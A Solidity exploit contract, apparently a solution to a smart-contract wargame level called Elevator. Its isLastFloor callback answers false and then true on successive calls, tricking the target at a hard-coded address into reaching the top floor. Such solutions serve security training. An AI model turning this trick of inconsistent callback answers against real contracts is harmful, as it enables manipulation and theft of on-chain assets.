// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

interface Elevator {
    function goTo(uint256 _floor) external;
}

contract HBuilding {
    Elevator private elevator =
        Elevator(0xFb1b927C06589eF2D7D13B7477CeAf44bF515E8f);
    bool public returnSwitch = false;

    function callGoTo() public {
        elevator.goTo(18);
    }

    function isLastFloor(uint256) public returns (bool) {
        if (!returnSwitch) {
            returnSwitch = true;
            return false;
        } else {
            returnSwitch = false;
            return true;
        }
    }
}
